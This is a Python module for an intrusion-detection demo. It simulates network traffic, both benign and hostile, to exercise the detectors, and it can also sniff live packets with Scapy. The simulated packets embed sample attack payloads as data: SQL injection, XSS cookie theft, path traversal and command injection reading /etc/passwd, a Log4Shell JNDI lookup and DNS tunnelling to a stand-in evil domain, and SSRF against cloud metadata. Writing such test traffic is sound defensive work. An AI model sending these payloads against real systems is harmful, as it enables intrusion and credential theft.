"""Packet capture: live Scapy sniffer + multi-attack simulation for demo."""
from __future__ import annotations
import random
import threading
import time
from collections import deque
from typing import Callable

from backend.capture.packet_parser import ParsedPacket

PacketHandler = Callable[[ParsedPacket | dict], None]


class PacketCapture:
    def __init__(self, interface: str = "lo", mode: str = "simulate"):
        self.interface = interface
        self.mode = mode
        self.handlers: list[PacketHandler] = []
        self._running = False
        self._thread: threading.Thread | None = None
        self.stats = {"packets": 0, "pps": 0}
        self._pps_window: deque = deque(maxlen=5000)

    def add_handler(self, fn: PacketHandler) -> None:
        self.handlers.append(fn)

    def _emit(self, pkt) -> None:
        self.stats["packets"] += 1
        self._pps_window.append(time.time())
        for h in self.handlers:
            try:
                h(pkt)
            except Exception:
                pass

    # ---- simulate: realistic mix incl. ALL attack classes ----
    _hosts = ["192.168.1.10", "192.168.1.20", "192.168.1.30", "10.0.0.5", "10.0.0.8"]
    _services = [80, 443, 22, 53, 3306, 21, 3389]
    _c2_domains = ["beacon.evil.example.com", "malicious.example.com"]

    def _random_packet(self) -> dict:
        r = random.random()
        H = self._hosts
        if r < 0.030:  # port scan sweep
            return {"src_ip": "10.0.0.99", "dst_ip": random.choice(H),
                    "src_port": random.randint(1024, 65535), "dst_port": random.randint(1, 2048),
                    "protocol": "TCP", "length": 60, "flags": "S", "payload_len": 0,
                    "dns_query": "", "http_payload": ""}
        if r < 0.045:  # null/xmas stealth scan
            return {"src_ip": "10.0.0.99", "dst_ip": random.choice(H),
                    "src_port": random.randint(1024, 65535), "dst_port": random.randint(1, 1024),
                    "protocol": "TCP", "length": 54, "flags": random.choice(["", "FPU"]),
                    "payload_len": 0, "dns_query": "", "http_payload": ""}
        if r < 0.065:  # syn flood burst
            return {"src_ip": f"172.16.0.{random.randint(2, 60)}", "dst_ip": H[0],
                    "src_port": random.randint(1024, 65535), "dst_port": 80,
                    "protocol": "TCP", "length": 60, "flags": "S", "payload_len": 0,
                    "dns_query": "", "http_payload": ""}
        if r < 0.080:  # udp flood burst
            return {"src_ip": f"172.16.1.{random.randint(2, 60)}", "dst_ip": H[1],
                    "src_port": random.randint(1024, 65535), "dst_port": 53 + random.randint(1, 500),
                    "protocol": "UDP", "length": random.randint(64, 512), "flags": "",
                    "payload_len": 100, "dns_query": "", "http_payload": ""}
        if r < 0.088:  # icmp flood
            return {"src_ip": f"172.16.2.{random.randint(2, 60)}", "dst_ip": H[2],
                    "src_port": 0, "dst_port": 0, "protocol": "ICMP", "length": 98,
                    "flags": "", "payload_len": 56, "dns_query": "", "http_payload": ""}
        if r < 0.100:  # ssh brute force
            return {"src_ip": "10.0.0.77", "dst_ip": random.choice(H),
                    "src_port": random.randint(1024, 65535), "dst_port": 22,
                    "protocol": "TCP", "length": 90, "flags": "PA", "payload_len": 40,
                    "dns_query": "", "http_payload": "SSH Failed password for root"}
        if r < 0.108:  # ftp brute force
            return {"src_ip": "10.0.0.78", "dst_ip": random.choice(H),
                    "src_port": random.randint(1024, 65535), "dst_port": 21,
                    "protocol": "TCP", "length": 90, "flags": "PA", "payload_len": 40,
                    "dns_query": "", "http_payload": "FTP login failed 530"}
        if r < 0.116:  # http brute force
            return {"src_ip": "10.0.0.79", "dst_ip": random.choice(H),
                    "src_port": random.randint(1024, 65535), "dst_port": 80,
                    "protocol": "TCP", "length": 300, "flags": "PA", "payload_len": 220,
                    "dns_query": "", "http_payload": "POST /login 401 authentication failure"}
        if r < 0.124:  # dns tunneling / exfil
            big = r > 0.120
            q = ("x" * random.randint(120, 160) if big else "x" * random.randint(55, 80)) + ".evil.example.com"
            return {"src_ip": random.choice(H), "dst_ip": "8.8.8.8",
                    "src_port": random.randint(1024, 65535), "dst_port": 53,
                    "protocol": "UDP", "length": 150, "flags": "", "payload_len": 110,
                    "dns_query": q, "http_payload": ""}
        if r < 0.130:  # malware c2 + beacon
            return {"src_ip": random.choice(H), "dst_ip": "93.184.216.34",
                    "src_port": random.randint(1024, 65535), "dst_port": 443,
                    "protocol": "TCP", "length": 180, "flags": "PA", "payload_len": 120,
                    "dns_query": random.choice(self._c2_domains), "http_payload": ""}
        if r < 0.136:  # sqli
            return {"src_ip": f"45.33.9.{random.randint(2, 200)}", "dst_ip": random.choice(H),
                    "src_port": random.randint(1024, 65535), "dst_port": 80,
                    "protocol": "TCP", "length": 500, "flags": "PA", "payload_len": 400,
                    "dns_query": "", "http_payload": "GET /product?id=1' UNION SELECT password FROM users-- "}
        if r < 0.142:  # xss
            return {"src_ip": f"45.33.9.{random.randint(2, 200)}", "dst_ip": random.choice(H),
                    "src_port": random.randint(1024, 65535), "dst_port": 80,
                    "protocol": "TCP", "length": 480, "flags": "PA", "payload_len": 380,
                    "dns_query": "", "http_payload": "GET /search?q=<script>document.cookie</script>"}
        if r < 0.146:  # path traversal
            return {"src_ip": f"45.33.9.{random.randint(2, 200)}", "dst_ip": random.choice(H),
                    "src_port": random.randint(1024, 65535), "dst_port": 80,
                    "protocol": "TCP", "length": 420, "flags": "PA", "payload_len": 320,
                    "dns_query": "", "http_payload": "GET /../../etc/passwd HTTP/1.1"}
        if r < 0.150:  # ARP spoof burst
            return {"src_ip": "192.168.1.66", "dst_ip": "192.168.1.1",
                    "src_port": 0, "dst_port": 0, "protocol": "ARP", "length": 42,
                    "flags": "", "payload_len": 0, "dns_query": "", "http_payload": ""}
        if r < 0.156:  # RDP brute force
            return {"src_ip": "10.0.0.80", "dst_ip": random.choice(H),
                    "src_port": random.randint(1024, 65535), "dst_port": 3389,
                    "protocol": "TCP", "length": 110, "flags": "PA", "payload_len": 50,
                    "dns_query": "", "http_payload": "RDP login failed 401 authentication failure"}
        if r < 0.162:  # Telnet / IoT brute force (Mirai-style)
            return {"src_ip": f"45.148.10.{random.randint(2, 200)}", "dst_ip": random.choice(H),
                    "src_port": random.randint(1024, 65535),
                    "dst_port": random.choice([23, 2323]),
                    "protocol": "TCP", "length": 80, "flags": "PA", "payload_len": 30,
                    "dns_query": "", "http_payload": "login failed password incorrect"}
        if r < 0.168:  # Log4Shell
            return {"src_ip": f"45.33.9.{random.randint(2, 200)}", "dst_ip": random.choice(H),
                    "src_port": random.randint(1024, 65535), "dst_port": 8080,
                    "protocol": "TCP", "length": 450, "flags": "PA", "payload_len": 350,
                    "dns_query": "", "http_payload": "GET /?x=${jndi:ldap://evil.example.com/a}"}
        if r < 0.174:  # command injection
            return {"src_ip": f"45.33.9.{random.randint(2, 200)}", "dst_ip": random.choice(H),
                    "src_port": random.randint(1024, 65535), "dst_port": 80,
                    "protocol": "TCP", "length": 430, "flags": "PA", "payload_len": 330,
                    "dns_query": "", "http_payload": "GET /ping?ip=8.8.8.8;cat /etc/passwd"}
        if r < 0.179:  # SSRF via cloud metadata
            return {"src_ip": f"45.33.9.{random.randint(2, 200)}", "dst_ip": random.choice(H),
                    "src_port": random.randint(1024, 65535), "dst_port": 80,
                    "protocol": "TCP", "length": 400, "flags": "PA", "payload_len": 300,
                    "dns_query": "", "http_payload": "GET /fetch?url=http://169.254.169.254/latest/meta-data/"}
        if r < 0.184:  # cryptominer stratum
            return {"src_ip": random.choice(H), "dst_ip": "203.0.113.77",
                    "src_port": random.randint(1024, 65535),
                    "dst_port": random.choice([3333, 4444, 5555]),
                    "protocol": "TCP", "length": 260, "flags": "PA", "payload_len": 180,
                    "dns_query": "",
                    "http_payload": '{"method":"mining.subscribe","params":["xmrig/6.0"]}'}
        if r < 0.188:  # data exfil (large egress)
            return {"src_ip": random.choice(H), "dst_ip": "203.0.113.9",
                    "src_port": random.randint(1024, 65535), "dst_port": 443,
                    "protocol": "TCP", "length": 1500, "flags": "PA", "payload_len": 1440,
                    "dns_query": "", "http_payload": ""}
        # benign
        return {"src_ip": random.choice(H),
                "dst_ip": random.choice(H + ["8.8.8.8", "1.1.1.1"]),
                "src_port": random.randint(1024, 65535),
                "dst_port": random.choice(self._services),
                "protocol": random.choice(["TCP", "TCP", "TCP", "UDP", "UDP", "ICMP", "ARP"]),
                "length": random.randint(60, 1500), "flags": "PA",
                "payload_len": random.randint(0, 1400),
                "dns_query": "", "http_payload": ""}

    def _burst_campaign(self) -> list[dict]:
        """Emit a rapid multi-packet campaign so count-based detectors fire."""
        H = self._hosts
        c = random.choice(["smb", "slowloris", "ntp_amp", "ping_sweep",
                           "horizontal", "spray"])
        pkts: list[dict] = []
        if c == "smb":  # lateral movement: 25 SMB SYNs from one host
            src = "10.0.0.66"
            for _ in range(25):
                pkts.append({"src_ip": src, "dst_ip": random.choice(H),
                             "src_port": random.randint(1024, 65535), "dst_port": 445,
                             "protocol": "TCP", "length": 60, "flags": "S",
                             "payload_len": 0, "dns_query": "", "http_payload": ""})
        elif c == "slowloris":  # 60 small partial POSTs
            src = f"45.33.10.{random.randint(2, 200)}"
            for _ in range(60):
                pkts.append({"src_ip": src, "dst_ip": H[0],
                             "src_port": random.randint(1024, 65535), "dst_port": 80,
                             "protocol": "TCP", "length": 150, "flags": "PA",
                             "payload_len": 90, "dns_query": "",
                             "http_payload": "POST /form Content-Length: 10000"})
        elif c == "ntp_amp":  # 60 NTP-amplification pkts at one target
            for _ in range(60):
                pkts.append({"src_ip": f"172.16.3.{random.randint(2, 60)}", "dst_ip": H[1],
                             "src_port": random.randint(1024, 65535), "dst_port": 123,
                             "protocol": "UDP", "length": 90, "flags": "",
                             "payload_len": 48, "dns_query": "", "http_payload": ""})
        elif c == "ping_sweep":  # one host pinging the whole subnet
            src = "10.0.0.70"
            for h in H * 3:
                pkts.append({"src_ip": src, "dst_ip": h, "src_port": 0,
                             "dst_port": 0, "protocol": "ICMP", "length": 98,
                             "flags": "", "payload_len": 56,
                             "dns_query": "", "http_payload": ""})
        elif c == "horizontal":  # one worm probing Redis everywhere
            src = "10.0.0.71"
            for h in H * 3:
                pkts.append({"src_ip": src, "dst_ip": h,
                             "src_port": random.randint(1024, 65535), "dst_port": 6379,
                             "protocol": "TCP", "length": 60, "flags": "S",
                             "payload_len": 0, "dns_query": "", "http_payload": ""})
        else:  # spray: one src failing logins across many hosts
            src = "10.0.0.72"
            for h in H * 2:
                pkts.append({"src_ip": src, "dst_ip": h,
                             "src_port": random.randint(1024, 65535), "dst_port": 22,
                             "protocol": "TCP", "length": 90, "flags": "PA",
                             "payload_len": 40, "dns_query": "",
                             "http_payload": "SSH Failed password for admin"})
        return pkts

    def _simulate_loop(self) -> None:
        while self._running:
            if random.random() < 0.18:  # burst campaign tick
                for pkt in self._burst_campaign():
                    if not self._running:
                        break
                    self._emit(pkt)
            for _ in range(random.randint(8, 35)):
                if not self._running:
                    break
                self._emit(self._random_packet())
            time.sleep(0.15)

    def _live_loop(self) -> None:
        try:
            from scapy.all import sniff
            from backend.capture.packet_parser import parse_raw, dict_from_parsed
        except ImportError:
            self._simulate_loop()
            return

        def _cb(pkt):
            p = parse_raw(pkt)
            if p is not None:
                self._emit(dict_from_parsed(p))

        sniff(iface=self.interface, prn=_cb, store=False,
              stop_filter=lambda _: not self._running)

    def start(self) -> None:
        if self._running:
            return
        self._running = True
        target = self._live_loop if self.mode == "live" else self._simulate_loop
        import threading as _t
        self._thread = _t.Thread(target=target, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        self._running = False

    def current_pps(self) -> float:
        now = time.time()
        while self._pps_window and now - self._pps_window[0] > 1.0:
            self._pps_window.popleft()
        return float(len(self._pps_window))
